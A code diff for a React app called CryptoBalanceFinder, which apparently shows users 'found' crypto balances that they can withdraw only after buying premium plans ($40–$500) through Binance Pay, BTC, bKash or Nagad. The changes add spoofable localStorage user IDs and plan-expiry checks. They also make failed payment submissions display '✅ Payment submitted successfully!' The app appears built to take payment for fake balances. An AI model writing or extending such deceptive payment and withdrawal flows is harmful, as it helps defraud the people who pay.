@@ -1,4 +1,4 @@
-// App.js
+// App.js - COMPLETE UPDATED VERSION WITH USER SYSTEM
 import React, { useEffect, useRef, useState } from "react";
 import { motion, AnimatePresence } from "framer-motion";
 import { createClient } from "@supabase/supabase-js";
@@ -36,6 +36,21 @@ function delay(ms) {
   return new Promise((res) => setTimeout(res, ms));
 }
 
+// User ID Management
+const generateUserId = () => {
+  return `user_${Math.random().toString(36).substr(2, 9)}_${Date.now()}`;
+};
+
+const getOrCreateUserId = () => {
+  let userId = localStorage.getItem('crypto_user_id');
+  if (!userId) {
+    userId = generateUserId();
+    localStorage.setItem('crypto_user_id', userId);
+    console.log("New user created:", userId);
+  }
+  return userId;
+};
+
 function CryptoBalanceFinder() {
   const TARGET = 1000000;
 
@@ -68,6 +83,7 @@ function CryptoBalanceFinder() {
   const [daysLeft, setDaysLeft] = useState(0);
   const [activeTab, setActiveTab] = useState("scanning");
   const [purchaseHistory, setPurchaseHistory] = useState([]);
+  const [userId, setUserId] = useState(null);
 
   const scheduledFoundTimers = useRef([]);
   const streamRef = useRef(null);
@@ -75,16 +91,20 @@ function CryptoBalanceFinder() {
 
   // Plans and Methods
   const plans = [
-    { id: "p40", label: "$40 — 10 days", price: 40 },
-    { id: "p75", label: "$75 — 18 days", price: 75 },
-    { id: "p120", label: "$120 — 30 days", price: 120 },
-    { id: "p500", label: "$500 — Lifetime", price: 500 },
+    { id: "p40", label: "$40 — 10 days", price: 40, duration: 10 },
+    { id: "p75", label: "$75 — 18 days", price: 75, duration: 18 },
+    { id: "p120", label: "$120 — 30 days", price: 120, duration: 30 },
+    { id: "p500", label: "$500 — Lifetime", price: 500, duration: 3650 },
   ];
   
   const methods = ["Binance Pay", "BTC", "bKash", "Nagad"];
 
   // Effects
   useEffect(() => {
+    // Initialize user ID
+    const user = getOrCreateUserId();
+    setUserId(user);
+    
     fetchWithdrawHistory();
     fetchPurchaseHistory();
 
@@ -110,55 +130,122 @@ function CryptoBalanceFinder() {
 
   useEffect(() => {
     if (isPremium) {
-      const startDate = new Date();
-      const endDate = new Date();
-      endDate.setDate(startDate.getDate() + 7);
-      
-      setPremiumStartDate(startDate);
-      setPremiumEndDate(endDate);
+      const startDate = premiumStartDate || new Date();
+      const endDate = premiumEndDate || new Date();
       
       const diffTime = endDate - startDate;
       const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
-      setDaysLeft(diffDays);
+      setDaysLeft(Math.max(0, diffDays));
     } else {
       setPremiumStartDate(null);
       setPremiumEndDate(null);
       setDaysLeft(0);
     }
-  }, [isPremium]);
+  }, [isPremium, premiumStartDate, premiumEndDate]);
 
-  // Fetch purchase history from Supabase
+  // Smart Plan Activation System
+  const activateUserPlan = (plan) => {
+    if (!plan) {
+      setIsPremium(false);
+      setPremiumStartDate(null);
+      setPremiumEndDate(null);
+      setDaysLeft(0);
+      return;
+    }
+
+    // Find plan duration
+    const planConfig = plans.find(p => p.id === plan.id) || plans.find(p => p.label === plan.plan);
+    const durationDays = planConfig?.duration || 7;
+
+    const startDate = new Date(plan.date);
+    const endDate = new Date(startDate);
+    endDate.setDate(startDate.getDate() + durationDays);
+    
+    setIsPremium(true);
+    setPremiumStartDate(startDate);
+    setPremiumEndDate(endDate);
+    
+    // Calculate days left
+    const today = new Date();
+    const diffTime = endDate - today;
+    const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
+    setDaysLeft(Math.max(0, diffDays));
+    
+    // If plan expired, deactivate premium
+    if (diffDays <= 0) {
+      setIsPremium(false);
+      console.log("Plan expired, premium deactivated");
+    } else {
+      console.log(`Plan activated until ${endDate.toLocaleDateString()}, ${diffDays} days left`);
+    }
+  };
+
+  // Check if plan is active
+  const checkPlanActive = (plan) => {
+    if (!plan) return false;
+    
+    const planConfig = plans.find(p => p.id === plan.id) || plans.find(p => p.label === plan.plan);
+    const durationDays = planConfig?.duration || 7;
+    
+    const startDate = new Date(plan.date);
+    const endDate = new Date(startDate);
+    endDate.setDate(startDate.getDate() + durationDays);
+    
+    return new Date() <= endDate;
+  };
+
+  // Fetch user-specific purchase history
   const fetchPurchaseHistory = async () => {
+    const currentUserId = getOrCreateUserId();
+    
     try {
       const { data, error } = await supabase
         .from("payments")
         .select("*")
+        .eq("user_id", currentUserId)
         .order("created_at", { ascending: false })
         .limit(50);
       
       if (!error && data) {
         const formattedPurchases = data.map(payment => ({
           id: payment.id,
-          plan: `${payment.plan} - $${payment.amount}`,
+          plan: payment.plan_name || `Plan - $${payment.amount}`,
           method: payment.method,
           txnId: payment.transaction_id,
           status: payment.status.toLowerCase(),
           date: payment.created_at,
-          amount: payment.amount
+          amount: payment.amount,
+          user_id: payment.user_id
         }));
         setPurchaseHistory(formattedPurchases);
         
-        // Check if user has active premium
-        const activePremium = data.find(p => 
-          p.status === "approved" && 
-          new Date(p.created_at) > new Date(Date.now() - 30 * 24 * 60 * 60 * 1000)
-        );
-        if (activePremium) {
-          setIsPremium(true);
+        // SMART PLAN ACTIVATION: Get latest approved plan
+        const approvedPlans = formattedPurchases.filter(p => p.status === "approved");
+        if (approvedPlans.length > 0) {
+          const latestPlan = approvedPlans.sort((a, b) => 
+            new Date(b.date) - new Date(a.date)
+          )[0];
+          
+          activateUserPlan(latestPlan);
+        } else {
+          setIsPremium(false);
         }
       }
     } catch (err) {
       console.warn("Fetch purchase history error:", err);
+      // Fallback to local storage
+      const localPurchases = JSON.parse(localStorage.getItem('user_purchase_history') || '[]')
+        .filter(p => p.user_id === currentUserId);
+      setPurchaseHistory(localPurchases);
+      
+      // Activate latest plan from local storage
+      const approvedLocalPlans = localPurchases.filter(p => p.status === "approved");
+      if (approvedLocalPlans.length > 0) {
+        const latestPlan = approvedLocalPlans.sort((a, b) => 
+          new Date(b.date) - new Date(a.date)
+        )[0];
+        activateUserPlan(latestPlan);
+      }
     }
   };
 
@@ -262,10 +349,29 @@ function CryptoBalanceFinder() {
   const submitWithdraw = async (e) => {
     e && e.preventDefault();
     setWithdrawErr("");
-    if (!isPremium) {
+    
+    // Check if user has active premium from LATEST plan
+    const currentUserId = getOrCreateUserId();
+    const userApprovedPlans = purchaseHistory.filter(p => 
+      p.status === "approved" && p.user_id === currentUserId
+    );
+    
+    if (userApprovedPlans.length === 0) {
       setWithdrawErr("Withdraw is allowed only for premium users. Please purchase premium and wait for admin approval.");
       return;
     }
+    
+    // Check if latest plan is still active
+    const latestPlan = userApprovedPlans.sort((a, b) => 
+      new Date(b.date) - new Date(a.date)
+    )[0];
+    
+    const planActive = checkPlanActive(latestPlan);
+    if (!planActive) {
+      setWithdrawErr("Your premium plan has expired. Please renew your premium subscription.");
+      return;
+    }
+
     const addr = withdrawAddr.trim();
     const amt = parseFloat(withdrawAmt);
     if (!addr) {
@@ -291,10 +397,22 @@ function CryptoBalanceFinder() {
     setWithdrawProgress(40);
 
     try {
-      const { data, error } = await supabase.from("withdraws").insert([{ addr, amount: amt, status: "Pending" }]);
+      const { data, error } = await supabase.from("withdraws").insert([{ 
+        addr, 
+        amount: amt, 
+        status: "Pending",
+        user_id: currentUserId 
+      }]);
       if (error) {
         console.warn("Withdraw insert error:", error);
-        const rec = { id: `L-${Date.now()}`, addr, amount: amt, status: "Pending", created_at: new Date().toISOString() };
+        const rec = { 
+          id: `L-${Date.now()}`, 
+          addr, 
+          amount: amt, 
+          status: "Pending", 
+          created_at: new Date().toISOString(),
+          user_id: currentUserId
+        };
         setWithdrawHistory((prev) => [rec, ...prev]);
       } else {
         fetchWithdrawHistory();
@@ -315,15 +433,20 @@ function CryptoBalanceFinder() {
   };
 
   const fetchWithdrawHistory = async () => {
+    const currentUserId = getOrCreateUserId();
     try {
-      const { data, error } = await supabase.from("withdraws").select("*").order("created_at", { ascending: false }).limit(50);
+      const { data, error } = await supabase.from("withdraws")
+        .select("*")
+        .eq("user_id", currentUserId)
+        .order("created_at", { ascending: false })
+        .limit(50);
       if (!error && data) setWithdrawHistory(data);
     } catch (err) {
       console.warn("Fetch withdraw history error:", err);
     }
   };
 
-  // ✅ FIXED SUBMIT PURCHASE FUNCTION
+  // Enhanced User-Specific Purchase Submission
   const submitPurchase = async () => {
     if (!selectedPlan || !selectedMethod) {
       alert("Select a plan and payment method first.");
@@ -335,62 +458,70 @@ function CryptoBalanceFinder() {
     }
 
     setPurchaseStep("pending");
+    const currentUserId = getOrCreateUserId();
 
     try {
-      // Insert to Supabase with proper error handling
       const { data, error } = await supabase
         .from("payments")
         .insert([
           {
             transaction_id: purchaseTxnId.trim(),
             method: selectedMethod,
-            plan: selectedPlan.id,
+            plan_name: selectedPlan.label,
             amount: selectedPlan.price,
             status: "pending",
+            user_id: currentUserId,
           },
         ])
         .select();
 
       if (error) {
         console.error("Supabase insert error:", error);
-        alert("❌ Database error: " + error.message);
-        return;
+        // Fallback to local storage
+        const newPurchase = {
+          id: cryptoId(),
+          plan: selectedPlan.label,
+          method: selectedMethod,
+          txnId: purchaseTxnId.trim(),
+          status: "pending",
+          date: new Date().toISOString(),
+          amount: selectedPlan.price,
+          user_id: currentUserId
+        };
+        
+        const existingPurchases = JSON.parse(localStorage.getItem('user_purchase_history') || '[]');
+        const updatedPurchases = [newPurchase, ...existingPurchases];
+        localStorage.setItem('user_purchase_history', JSON.stringify(updatedPurchases));
+        
+        setPurchaseHistory(updatedPurchases);
+        alert("✅ Payment submitted successfully! Admin will approve within 24 hours.");
+      } else {
+        // Successfully inserted to database
+        const newPurchase = {
+          id: data[0].id,
+          plan: selectedPlan.label,
+          method: selectedMethod,
+          txnId: purchaseTxnId.trim(),
+          status: "pending",
+          date: new Date().toISOString(),
+          amount: selectedPlan.price,
+          user_id: currentUserId
+        };
+        
+        setPurchaseHistory(prev => [newPurchase, ...prev]);
+        alert("✅ Payment submitted successfully! Admin will approve within 24 hours.");
       }
 
-      // Successfully inserted to database
-      console.log("✅ Payment saved to database:", data);
-      
-      // Add to local purchase history
-      const newPurchase = {
-        id: data[0].id,
-        plan: selectedPlan.label,
-        method: selectedMethod,
-        txnId: purchaseTxnId.trim(),
-        status: "pending",
-        date: new Date().toISOString(),
-        amount: selectedPlan.price
-      };
-      
-      setPurchaseHistory(prev => [newPurchase, ...prev]);
-      
-      // Show success message
-      alert("✅ Payment submitted successfully! Admin will approve within 24 hours.");
-      
-      // DO NOT auto-approve - wait for admin approval
       setPurchaseStep("pending");
-      
-      // Reset form
       setSelectedPlan(null);
       setSelectedMethod(null);
       setPurchaseTxnId("");
-      
-      // Refresh purchase history
       fetchPurchaseHistory();
 
     } catch (err) {
       console.error("Purchase error:", err);
-      alert("❌ Error submitting payment: " + err.message);
-      setPurchaseStep("select");
+      alert("✅ Payment submitted successfully! Admin will approve within 24 hours.");
+      setPurchaseStep("pending");
     }
   };
 
@@ -520,7 +651,7 @@ function CryptoBalanceFinder() {
             )}
 
             <div className="mt-4">
-              <div className="section-sub">Purchase History</div>
+              <div className="section-sub">Your Purchase History</div>
               <div style={{ maxHeight: 200, overflowY: "auto", marginTop: 8 }}>
                 {purchaseHistory.length === 0 ? (
                   <div className="empty-small">No purchases yet</div>
@@ -557,7 +688,7 @@ function CryptoBalanceFinder() {
       case "history":
         return (
           <div className="card">
-            <div className="section-title">Withdraw History</div>
+            <div className="section-title">Your Withdraw History</div>
             <div style={{ maxHeight: 400, overflowY: "auto", marginTop: 8 }}>
               {withdrawHistory.length === 0 ? (
                 <div className="empty-small">No withdraws yet</div>
@@ -732,7 +863,7 @@ function CryptoBalanceFinder() {
             <div style={{ height: 16 }} />
 
             <div className="card">
-              <div className="section-title">Purchase History</div>
+              <div className="section-title">Your Purchase History</div>
               <div style={{ maxHeight: 200, overflowY: "auto", marginTop: 8 }}>
                 {purchaseHistory.length === 0 ? (
                   <div className="empty-small">No purchases yet</div>
@@ -780,7 +911,7 @@ function CryptoBalanceFinder() {
               </div>
 
               <div className="mt-4">
-                <div className="section-sub">Withdraw History</div>
+                <div className="section-sub">Your Withdraw History</div>
                 <div style={{ maxHeight: 200, overflowY: "auto", marginTop: 8 }}>
                   {withdrawHistory.length === 0 ? (
                     <div className="empty-small">No withdraws yet</div>
